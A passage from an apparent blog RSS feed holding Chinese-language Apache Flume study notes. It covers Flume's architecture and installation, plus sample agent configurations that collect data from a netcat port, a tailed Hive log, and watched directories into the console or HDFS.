channel</p><p>a1.channels.c1.type = memory</p><p>a1.channels.c1.capacity = 1000</p><p>a1.channels.c1.transactionCapacity = 100</p><p># Bind the source and sink to the channel</p><p>a1.sources.r1.channels = c1</p><p>a1.sinks.k1.channel = c1</p><p>（3）创建flume2-netcat-flume.conf</p><p>配置Source监控端口44444数据流，配置Sink数据到下一级Flume：</p><p>在hadoop103上编辑配置文件</p><p>[molly@hadoop102 group3]$ vim flume2-netcat-flume.conf</p><p>添加如下内容</p><p># Name the components on this agent</p><p>a2.sources = r1</p><p>a2.sinks = k1</p><p>a2.channels = c1</p><p># Describe/configure the source</p><p>a2.sources.r1.type = netcat</p><p>a2.sources.r1.bind = hadoop103</p><p>a2.sources.r1.port = 44444</p><p># Describe the sink</p><p>a2.sinks.k1.type = avro</p><p>a2.sinks.k1.hostname = hadoop104</p><p>a2.sinks.k1.port = 4141</p><p># Use a channel which buffers events in memory</p><p>a2.channels.c1.type = memory</p><p>a2.channels.c1.capacity = 1000</p><p>a2.channels.c1.transactionCapacity = 100</p><p># Bind the source and sink to the channel</p><p>a2.sources.r1.channels = c1</p><p>a2.sinks.k1.channel = c1</p><p>（4）创建flume3-flume-logger.conf</p><p>配置source用于接收flume1与flume2发送过来的数据流，最终合并后sink到控制台。</p><p>在hadoop104上编辑配置文件</p><p>[molly@hadoop104 group3]$ touch flume3-flume-logger.conf</p><p>[molly@hadoop104 group3]$ vim flume3-flume-logger.conf</p><p>添加如下内容</p><p># Name the components on this agent</p><p>a3.sources = r1</p><p>a3.sinks = k1</p><p>a3.channels = c1</p><p># Describe/configure the source</p><p>a3.sources.r1.type = avro</p><p>a3.sources.r1.bind = hadoop104</p><p>a3.sources.r1.port = 4141</p><p># Describe the sink</p><p># Describe the sink</p><p>a3.sinks.k1.type = logger</p><p># Describe the channel</p><p>a3.channels.c1.type = memory</p><p>a3.channels.c1.capacity = 1000</p><p>a3.channels.c1.transactionCapacity = 100</p><p># Bind the source and sink to the channel</p><p>a3.sources.r1.channels = c1</p><p>a3.sinks.k1.channel = c1</p><p>（5）执行配置文件</p><p>分别开启对应配置文件：flume3-flume-logger.conf，flume2-netcat-flume.conf，flume1-logger-flume.conf。</p><p>[molly@hadoop104 flume]$ bin/flume-ng agent –conf conf/ –name a3 –conf-file job/group3/flume3-flume-logger.conf -Dflume.root.logger=INFO,console</p><p>[molly@hadoop102 flume]$ bin/flume-ng agent –conf conf/ –name a2 –conf-file job/group3/flume1-logger-flume.conf</p><p>[molly@hadoop103 flume]$ bin/flume-ng agent –conf conf/ –name a1 –conf-file job/group3/flume2-netcat-flume.conf</p><p>（6）在hadoop103上向/opt/module目录下的group.log追加内容</p><p>[molly@hadoop103 module]$ echo ‘hello’ &gt; group.log</p><p>（7）在hadoop102上向44444端口发送数据</p><p>[molly@hadoop102 flume]$ telnet hadoop102 44444</p><p>（8）检查hadoop104上数据</p><p><strong><img src="file:///C:/Users/MENGLI~1.ZHA/AppData/Local/Temp/msohtmlclip1/01/clip_image010.png" alt="1528770881(bigdata-flume2-framework/clip_image010.png)"></strong></p>]]></content:encoded>
      
      
      <category domain="https://m01ly.github.io/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%BC%80%E5%8F%91/">大数据开发</category>
      
      
      <category domain="https://m01ly.github.io/tags/flume/">flume</category>
      
      
      <comments>https://m01ly.github.io/2020/11/15/bigdata-flume2-framework/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>flume学习笔记（一） flume搭建</title>
      <link>https://m01ly.github.io/2020/11/15/bigdata-flume1-setup/</link>
      <guid>https://m01ly.github.io/2020/11/15/bigdata-flume1-setup/</guid>
      <pubDate>Sun, 15 Nov 2020 07:46:51 GMT</pubDate>
      
        
        
      <description></description>
        
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>前面我们学习到hadoop主要用于大数据的存储和计算；Hive提供更方便的数据分析能力；那有没有想过研究大数据，我们想想大数据是从哪里来的呢？这篇我们学习flume框架，用于数据采集的，并且采集的类型是日志（业务服务的行为数据）；所以<strong>flume就是将服务生产的日志自动实时的搬运（传输）到hdfs上。</strong></p><h2 id="1-1-Flume定义"><a href="#1-1-Flume定义" class="headerlink" title="1.1 Flume定义"></a>1.1 Flume定义</h2><p><a href="https://flume.apache.org/">Flume</a>是Cloudera提供的一个高可用的，高可靠的，分布式的海量日志采集、聚合和传输的系统。Flume基于流式架构，灵活简单。</p><p><img src="/2020/11/15/bigdata-flume1-setup/1637056045712.png" alt="1637056045712"></p><p><strong>Flume最主要的作用就是：实时读取服务器本地磁盘文件夹（或者日志服务器的日志）的日志/数据，然后将数据上传到hdfs中。</strong></p><h2 id="1-2-Flume基础架构"><a href="#1-2-Flume基础架构" class="headerlink" title="1.2 Flume基础架构"></a>1.2 Flume基础架构</h2><p>Flume组成架构如下图所示。</p><p><img src="/2020/11/15/bigdata-flume1-setup/1637056457927.png" alt="1637056457927"></p><p>数据来源：从日志服务器</p><p>数据到哪里：hdfs</p><h3 id="1-2-1-Agent"><a href="#1-2-1-Agent" class="headerlink" title="1.2.1 Agent"></a>1.2.1 Agent</h3><p>Agent是一个JVM进程，它以事件的形式将数据从源头送至目的。</p><p>Agent主要有3个部分组成，Source、Channel、Sink。</p><h3 id="1-2-2-Source"><a href="#1-2-2-Source" class="headerlink" title="1.2.2 Source"></a>1.2.2 Source</h3><p>Source是负责<strong>接收数据</strong>到Flume Agent的组件。Source组件可以处理各种类型、各种格式的日志数据，包括avro、thrift、exec、jms、spooling directory、netcat、 taildir 、sequence generator、syslog、http、legacy。</p><h3 id="1-2-3-Sink"><a href="#1-2-3-Sink" class="headerlink" title="1.2.3 Sink"></a>1.2.3 Sink</h3><p>Sink不断地轮询Channel中的事件且<strong>批量地移除</strong>它们，并将这些事件<strong>批量写入到存储或索引系统</strong>、或者被发送到另一个Flume Agent。</p><p>Sink组件目的地包括hdfs、logger、avro、thrift、ipc、file、HBase、solr、自定义。</p><h3 id="1-2-4-Channel"><a href="#1-2-4-Channel" class="headerlink" title="1.2.4 Channel"></a>1.2.4 Channel</h3><p>Channel是位于Source和Sink之间的<strong>缓冲区</strong>。因此，Channel允许Source和Sink运作在不同的速率上。<strong>Channel是线程安全的，可以同时处理几个Source的写入操作和几个Sink的读取操作</strong>(有可能一个chanel对应多个source和多个sink)。</p><p><strong>Flume自带两种Channel：Memory Channel和File Channel。</strong></p><p>Memory Channel是内存中的队列。Memory Channel在不需要关心数据丢失的情景下适用。如果需要关心数据丢失，那么Memory Channel就不应该使用，因为程序死亡、机器宕机或者重启都会导致数据丢失。</p><p>File Channel将所有事件写到磁盘。因此在程序关闭或机器宕机的情况下不会丢失数据。</p><h3 id="1-2-5-Event"><a href="#1-2-5-Event" class="headerlink" title="1.2.5 Event"></a>1.2.5 Event</h3><p><strong>传输单元，Flume数据传输的基本单元</strong>，以Event的形式将数据从源头送至目的地。Event由Header和Body两部分组成，Header用来存放该event的一些属性，为K-V结构（通常是没有数据的），Body用来存放该条数据，形式为字节数组。</p><p><img src="/2020/11/15/bigdata-flume1-setup/1637056654444.png" alt="1637056654444"></p><h1 id="2-Flume入门"><a href="#2-Flume入门" class="headerlink" title="2 Flume入门"></a>2 Flume入门</h1><h2 id="2-1-Flume安装部署"><a href="#2-1-Flume安装部署" class="headerlink" title="2.1 Flume安装部署"></a>2.1 Flume安装部署</h2><h3 id="2-1-1-安装地址"><a href="#2-1-1-安装地址" class="headerlink" title="2.1.1 安装地址"></a>2.1.1 安装地址</h3><p>（1）Flume官网地址：<a href="http://flume.apache.org/">http://flume.apache.org/</a></p><p>（2）文档查看地址：<a href="http://flume.apache.org/FlumeUserGuide.html">http://flume.apache.org/FlumeUserGuide.html</a></p><p>（3）下载地址：<a href="http://archive.apache.org/dist/flume/">http://archive.apache.org/dist/flume/</a></p><h3 id="2-1-2-安装部署"><a href="#2-1-2-安装部署" class="headerlink" title="2.1.2 安装部署"></a>2.1.2 安装部署</h3><p>（1）将apache-flume-1.9.0-bin.tar.gz上传到linux的/opt/software目录下</p><p>（2）解压apache-flume-1.9.0-bin.tar.gz到/opt/module/目录下</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 software<span class="token punctuation">]</span>$ <span class="token function">tar</span> -zxf /opt/software/apache-flume-1.9.0-bin.tar.gz -C /opt/module/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（3）修改apache-flume-1.9.0-bin的名称为flume-1.9.0</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 module<span class="token punctuation">]</span>$ <span class="token function">mv</span> /opt/module/apache-flume-1.9.0-bin /opt/module/flume<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（4）将lib文件夹下的guava-11.0.2.jar删除以兼容Hadoop 3.1.3</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 lib<span class="token punctuation">]</span>$ <span class="token function">rm</span> /opt/module/flume/lib/guava-11.0.2.jar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-2-Flume入门案例"><a href="#2-2-Flume入门案例" class="headerlink" title="2.2 Flume入门案例"></a>2.2 Flume入门案例</h2><h3 id="2-2-1-监控端口数据官方案例"><a href="#2-2-1-监控端口数据官方案例" class="headerlink" title="2.2.1 监控端口数据官方案例"></a>2.2.1 监控端口数据官方案例</h3><p>1）案例需求：</p><p>使用Flume监听一个端口4444，收集该端口数据，并打印到控制台。 </p><p>2）需求分析：</p><p><img src="/2020/11/15/bigdata-flume1-setup/1637055202443.png" alt="1637055202443"></p><p><img src="/2020/11/15/bigdata-flume1-setup/1637057440088.png" alt="1637057440088"></p><p>source端：选用netcat TCP</p><p>Channel：memory channel</p><p>sink：选用logger sink</p><p>3）实现步骤：</p><p>（1）安装netcat工具(man nc 查看手册)</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 software<span class="token punctuation">]</span>$ <span class="token function">sudo</span> yum <span class="token function">install</span> -y nc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（2）判断44444端口是否被占用</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 flume-telnet<span class="token punctuation">]</span>$ <span class="token function">sudo</span> <span class="token function">netstat</span> -nlp <span class="token operator">|</span> <span class="token function">grep</span> 44444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（3）创建Flume Agent配置文件flume-netcat-logger.conf</p><p>（4）在flume目录下创建job文件夹并进入job文件夹。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 flume<span class="token punctuation">]</span>$ <span class="token function">mkdir</span> job<span class="token punctuation">[</span>molly@hadoop102 flume<span class="token punctuation">]</span>$ <span class="token function">cd</span> job/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>（5）在job文件夹下创建Flume Agent配置文件flume-netcat-logger.conf。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 job<span class="token punctuation">]</span>$ vim flume-netcat-logger.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（6）在flume-netcat-logger.conf文件中添加如下内容。</p><p>添加内容如下：</p><pre class="line-numbers language-sh"><code class="language-sh"># Name the components on this agenta1.sources = r1a1.sinks = k1a1.channels = c1# Describe/configure the sourcea1.sources.r1.type = netcata1.sources.r1.bind = localhosta1.sources.r1.port = 44444# Describe the sinka1.sinks.k1.type = logger# Use a channel which buffers events in memorya1.channels.c1.type = memorya1.channels.c1.capacity = 1000a1.channels.c1.transactionCapacity = 100# Bind the source and sink to the channela1.sources.r1.channels = c1a1.sinks.k1.channel = c1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注：配置文件来源于官方手册<a href="http://flume.apache.org/FlumeUserGuide.html">http://flume.apache.org/FlumeUserGuide.html</a></p><p><img src="/2020/11/15/bigdata-flume1-setup/1637055240301.png" alt="1637055240301"></p><p>（7）先开启flume监听端口</p><p>第一种写法：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 flume<span class="token punctuation">]</span>$ bin/flume-ng agent --conf conf/ --name a1 --conf-file job/flume-netcat-logger.conf -Dflume.root.logger<span class="token operator">=</span>INFO,console<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第二种写法：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 flume<span class="token punctuation">]</span>$ bin/flume-ng agent -c conf/ -n a1 -f job/flume-netcat-logger.conf -Dflume.root.logger<span class="token operator">=</span>INFO,console<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>参数说明：</p><p>​    –conf/-c：表示配置文件存储在conf/目录</p><p>​    –name/-n：表示给agent起名为a1</p><p>​    –conf-file/-f：flume本次启动读取的配置文件是在job文件夹下的flume-telnet.conf文件。</p><p>​    -Dflume.root.logger=INFO,console ：-D表示flume运行时动态修改flume.root.logger参数属性值，并将控制台日志打印级别设置为INFO级别。日志级别包括:log、info、warn、error。</p><p>（8）使用netcat工具向本机的44444端口发送内容</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 ~<span class="token punctuation">]</span>$ nc localhost 44444hello molly<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>（9）在Flume监听页面观察接收数据情况</p><p>思考：nc hadoop102 44444，flume能否接收到？</p><h3 id="2-2-2-实时监控单个追加文件"><a href="#2-2-2-实时监控单个追加文件" class="headerlink" title="2.2.2 实时监控单个追加文件"></a>2.2.2 实时监控单个追加文件</h3><p>1）案例需求：实时监控Hive日志，并上传到HDFS中</p><p>2）需求分析：         source类型：exec source  </p><p><img src="/2020/11/15/bigdata-flume1-setup/1637059514026.png" alt="1637059514026"></p><p>3）实现步骤：</p><p>（1）Flume要想将数据输出到HDFS，依赖Hadoop相关jar包</p><p>检查/etc/profile.d/my_env.sh文件，确认Hadoop和Java环境变量配置正确</p><pre class="line-numbers language-sh"><code class="language-sh">JAVA_HOME=/opt/module/jdk1.8.0_212HADOOP_HOME=/opt/module/ha/hadoop-3.1.3PATH=$PATH:$JAVA_HOME/bin:$HADOOP_HOME/bin:$HADOOP_HOME/sbinexport PATH JAVA_HOME HADOOP_HOME<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>（2）创建flume-file-hdfs.conf文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 job<span class="token punctuation">]</span>$ vim flume-file-hdfs.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注：要想读取Linux系统中的文件，就得按照Linux命令的规则执行命令。由于Hive日志在Linux系统中所以读取文件的类型选择：exec即execute执行的意思。表示执行Linux命令来读取文件。</p><p>添加如下内容</p><pre class="line-numbers language-sh"><code class="language-sh"># Name the components on this agenta2.sources = r2a2.sinks = k2a2.channels = c2# Describe/configure the sourcea2.sources.r2.type = execa2.sources.r2.command = tail -F /opt/module/hive/logs/hive.log# Describe the sinka2.sinks.k2.type = hdfs# hdfs类型的sinka2.sinks.k2.hdfs.path = hdfs://hadoop102:8020/flume/%Y%m%d/%H#上传到hdfs#上传文件的前缀a2.sinks.k2.hdfs.filePrefix = logs-#是否按照时间滚动文件夹  #按照时间写入不同给的文件中a2.sinks.k2.hdfs.round = true#多少时间单位创建一个新的文件夹a2.sinks.k2.hdfs.roundValue = 1#重新定义时间单位a2.sinks.k2.hdfs.roundUnit = hour#是否使用本地时间戳a2.sinks.k2.hdfs.useLocalTimeStamp = true#积攒多少个Event才flush到HDFS一次a2.sinks.k2.hdfs.batchSize = 100#设置文件类型，可支持压缩a2.sinks.k2.hdfs.fileType = DataStream#多久生成一个新的文件a2.sinks.k2.hdfs.rollInterval = 60#设置每个文件的滚动大小a2.sinks.k2.hdfs.rollSize = 134217700#文件的滚动与Event数量无关a2.sinks.k2.hdfs.rollCount = 0# Use a channel which buffers events in memorya2.channels.c2.type = memorya2.channels.c2.capacity = 1000a2.channels.c2.transactionCapacity = 100# Bind the source and sink to the channela2.sources.r2.channels = c2a2.sinks.k2.channel = c2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意：</p><p>对于所有与时间相关的转义序列，Event Header中必须存在以 “timestamp”的key（除非hdfs.useLocalTimeStamp设置为true，此方法会使用TimestampInterceptor自动添加timestamp）。</p><p>a3.sinks.k3.hdfs.useLocalTimeStamp = true</p><p><img src="/2020/11/15/bigdata-flume1-setup/1637059968136.png" alt="1637059968136"></p><p>（3）运行Flume</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 flume<span class="token punctuation">]</span>$ bin/flume-ng agent --conf conf/ --name a2 --conf-file job/flume-file-hdfs.conf  -Dflume.root.logger<span class="token operator">=</span>INFO,console<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（4）开启Hadoop和Hive并操作Hive产生日志</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 hadoop-2.7.2<span class="token punctuation">]</span>$ sbin/start-dfs.sh<span class="token punctuation">[</span>molly@hadoop103 hadoop-2.7.2<span class="token punctuation">]</span>$ sbin/start-yarn.sh<span class="token punctuation">[</span>molly@hadoop102 hive<span class="token punctuation">]</span>$ bin/hivehive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>（5）在HDFS上查看文件。</p><p>正在使用的文件的后缀是.tmp</p><p><img src="/2020/11/15/bigdata-flume1-setup/1637062965508.png" alt="1637062965508"></p><h3 id="2-2-3-实时监控目录下多个新文件"><a href="#2-2-3-实时监控目录下多个新文件" class="headerlink" title="2.2.3 实时监控目录下多个新文件"></a>2.2.3 实时监控目录下多个新文件</h3><p>1）案例需求：使用Flume监听整个目录的新文件,<strong>有新文件</strong>出现，将新文件数据上传至HDFS</p><p>2）需求分析：</p><p><img src="/2020/11/15/bigdata-flume1-setup/1637063102633.png" alt="1637063102633"></p><p>3）实现步骤：</p><p>（1）创建配置文件flume-dir-hdfs.conf</p><p>创建一个文件</p><p>[molly@hadoop102 job]$ vim flume-dir-hdfs.conf</p><p>添加如下内容</p><pre class="line-numbers language-bash"><code class="language-bash">a3.sources <span class="token operator">=</span> r3a3.sinks <span class="token operator">=</span> k3a3.channels <span class="token operator">=</span> c3<span class="token comment" spellcheck="true"># Describe/configure the source</span>a3.sources.r3.type <span class="token operator">=</span> spooldira3.sources.r3.spoolDir <span class="token operator">=</span> /opt/module/flume/upload  <span class="token comment" spellcheck="true">#监控的目录</span>a3.sources.r3.fileSuffix <span class="token operator">=</span> .COMPLETED <span class="token comment" spellcheck="true">#采集过的文件表示这个后缀；后面将不会对旧文件进行采集</span>a3.sources.r3.fileHeader <span class="token operator">=</span> <span class="token boolean">true</span><span class="token comment" spellcheck="true">#忽略所有以.tmp结尾的文件，不上传</span>a3.sources.r3.ignorePattern <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">[</span>^ <span class="token punctuation">]</span>*\.tmp<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># Describe the sink</span>a3.sinks.k3.type <span class="token operator">=</span> hdfsa3.sinks.k3.hdfs.path <span class="token operator">=</span> hdfs://hadoop102:8020/flume/upload/%Y%m%d/%H<span class="token comment" spellcheck="true">#上传文件的前缀</span>a3.sinks.k3.hdfs.filePrefix <span class="token operator">=</span> upload-<span class="token comment" spellcheck="true">#是否按照时间滚动文件夹</span>a3.sinks.k3.hdfs.round <span class="token operator">=</span> <span class="token boolean">true</span><span class="token comment" spellcheck="true">#多少时间单位创建一个新的文件夹</span>a3.sinks.k3.hdfs.roundValue <span class="token operator">=</span> 1<span class="token comment" spellcheck="true">#重新定义时间单位</span>a3.sinks.k3.hdfs.roundUnit <span class="token operator">=</span> hour<span class="token comment" spellcheck="true">#是否使用本地时间戳</span>a3.sinks.k3.hdfs.useLocalTimeStamp <span class="token operator">=</span> <span class="token boolean">true</span><span class="token comment" spellcheck="true">#积攒多少个Event才flush到HDFS一次</span>a3.sinks.k3.hdfs.batchSize <span class="token operator">=</span> 100<span class="token comment" spellcheck="true">#设置文件类型，可支持压缩</span>a3.sinks.k3.hdfs.fileType <span class="token operator">=</span> DataStream<span class="token comment" spellcheck="true">#多久生成一个新的文件</span>a3.sinks.k3.hdfs.rollInterval <span class="token operator">=</span> 60<span class="token comment" spellcheck="true">#设置每个文件的滚动大小大概是128M</span>a3.sinks.k3.hdfs.rollSize <span class="token operator">=</span> 134217700<span class="token comment" spellcheck="true">#文件的滚动与Event数量无关</span>a3.sinks.k3.hdfs.rollCount <span class="token operator">=</span> 0<span class="token comment" spellcheck="true"># Use a channel which buffers events in memory</span>a3.channels.c3.type <span class="token operator">=</span> memorya3.channels.c3.capacity <span class="token operator">=</span> 1000a3.channels.c3.transactionCapacity <span class="token operator">=</span> 100<span class="token comment" spellcheck="true"># Bind the source and sink to the channel</span>a3.sources.r3.channels <span class="token operator">=</span> c3a3.sinks.k3.channel <span class="token operator">=</span> c3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2020/11/15/bigdata-flume1-setup/1637063607668.png" alt="1637063607668"></p><p>（2）启动监控文件夹命令</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 flume<span class="token punctuation">]</span>$ bin/flume-ng agent --conf conf/ --name a3 --conf-file job/flume-dir-hdfs.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>说明：在使用Spooling Directory Source时，不要在监控目录中创建并持续修改文件；上传完成的文件会以.COMPLETED结尾；被监控文件夹每500毫秒扫描一次文件变动。</p><p>（3）向upload文件夹中添加文件</p><p>在/opt/module/flume目录下创建upload文件夹</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 flume<span class="token punctuation">]</span>$ <span class="token function">mkdir</span> upload<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>向upload文件夹中添加文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 upload<span class="token punctuation">]</span>$ <span class="token function">touch</span> molly.txt<span class="token punctuation">[</span>molly@hadoop102 upload<span class="token punctuation">]</span>$ <span class="token function">touch</span> molly.tmp<span class="token punctuation">[</span>molly@hadoop102 upload<span class="token punctuation">]</span>$ <span class="token function">touch</span> molly.log<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>（4）查看HDFS上的数据</p><p><img src="/2020/11/15/bigdata-flume1-setup/1637063370689.png" alt="1637063370689"></p><p>（5）查看采集后的文件，发现文件已经加了后缀COMPLETED</p><p><img src="/2020/11/15/bigdata-flume1-setup/1637063420040.png" alt="1637063420040"></p><h3 id="2-2-4-实时监控目录下的多个追加文件"><a href="#2-2-4-实时监控目录下的多个追加文件" class="headerlink" title="2.2.4 实时监控目录下的多个追加文件"></a>2.2.4 实时监控目录下的多个追加文件</h3><p>Exec source适用于监控<strong>一个实时追加**</strong>的文件，不能实现断点续传；Spooldir Source适合用于同步新文件，但不适合对实时追加日志的文件进行监听并同步；而<strong>Taildir Source适合用于监听多个实时追加的文件</strong>，并且能够实现断点续传。</p><p>1）案例需求:使用Flume监听整个目录的实时追加文件，并上传至HDFS</p><p>2）需求分析:</p><p><img src="/2020/11/15/bigdata-flume1-setup/1637063679839.png" alt="1637063679839"></p><p>3）实现步骤：</p><p>（1）创建配置文件flume-taildir-hdfs.conf</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 job<span class="token punctuation">]</span>$ vim flume-taildir-hdfs.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>添加如下内容</p><pre class="line-numbers language-sh"><code class="language-sh">a3.sources = r3a3.sinks = k3a3.channels = c3# Describe/configure the sourcea3.sources.r3.type = TAILDIRa3.sources.r3.positionFile = /opt/module/flume/tail_dir.json  #记录采集的位置 从而实现断点续传a3.sources.r3.filegroups = f1 f2  #监控的多个文件组a3.sources.r3.filegroups.f1 = /opt/module/flume/files/.*file.* #监控f1组的文件a3.sources.r3.filegroups.f2 = /opt/module/flume/files2/.*log.*# Describe the sinka3.sinks.k3.type = hdfsa3.sinks.k3.hdfs.path = hdfs://hadoop102:8020/flume/upload2/%Y%m%d/%H#上传文件的前缀a3.sinks.k3.hdfs.filePrefix = upload-#是否按照时间滚动文件夹a3.sinks.k3.hdfs.round = true#多少时间单位创建一个新的文件夹a3.sinks.k3.hdfs.roundValue = 1#重新定义时间单位a3.sinks.k3.hdfs.roundUnit = hour#是否使用本地时间戳a3.sinks.k3.hdfs.useLocalTimeStamp = true#积攒多少个Event才flush到HDFS一次a3.sinks.k3.hdfs.batchSize = 100#设置文件类型，可支持压缩a3.sinks.k3.hdfs.fileType = DataStream#多久生成一个新的文件a3.sinks.k3.hdfs.rollInterval = 60#设置每个文件的滚动大小大概是128Ma3.sinks.k3.hdfs.rollSize = 134217700#文件的滚动与Event数量无关a3.sinks.k3.hdfs.rollCount = 0# Use a channel which buffers events in memorya3.channels.c3.type = memorya3.channels.c3.capacity = 1000a3.channels.c3.transactionCapacity = 100# Bind the source and sink to the channela3.sources.r3.channels = c3a3.sinks.k3.channel = c3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2020/11/15/bigdata-flume1-setup/1637064020425.png" alt="1637064020425"></p><p>（2）启动监控文件夹命令</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 flume<span class="token punctuation">]</span>$ bin/flume-ng agent --conf conf/ --name a3 --conf-file job/flume-taildir-hdfs.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（3）向files文件夹中追加内容</p><p>在/opt/module/flume目录下创建files文件夹</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 flume<span class="token punctuation">]</span>$ <span class="token function">mkdir</span> files<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>向upload文件夹中添加文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 files<span class="token punctuation">]</span>$ <span class="token keyword">echo</span> hello <span class="token operator">>></span> file1.txt<span class="token punctuation">[</span>molly@hadoop102 files<span class="token punctuation">]</span>$ <span class="token keyword">echo</span> molly <span class="token operator">>></span> file2.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>（4）查看HDFS上的数据</p><p><strong>（5）为啥Taildir可以断点续传？？</strong></p><p>  Taildir Source维护了一个json格式的position File，其会定期的往position File中更新每个文件读取到的最新的位置，因此能够实现断点续传。Position File的格式如下：</p><p>{“inode”:2496272,”pos”:12,”file”:”/opt/module/flume/files/file1.txt”}<br>{“inode”:2496275,”pos”:12,”file”:”/opt/module/flume/files/file2.txt”}</p><p>注：Linux中储存文件元数据的区域就叫做inode，每个inode都有一个号码，操作系统用inode号码来识别不同的文件，Unix/Linux系统内部不使用文件名，而使用inode号码来识别文件。</p>]]></content:encoded>
      
      
      <category domain="https://m01ly.github.io/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%BC%80%E5%8F%91/">大数据开发</category>
      
      
      <category domain="https://m01ly.github.io/tags/flume/">flume</category>
      
      
      <comments>https://m01ly.github.io/2020/11/15/bigdata-flume1-setup/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Hive学习笔记（三） Hive的分区表和分桶表</title>
      <link>https://m01ly.github.io/2020/11/15/bigdata-hive3/</link>
      <guid>https://m01ly.github.io/2020/11/15/bigdata-hive3/</guid>
      <pubDate>Sun, 15 Nov 2020 07:45:51 GMT</pubDate>
      
        
        
      <description></description>
        
      
      
      
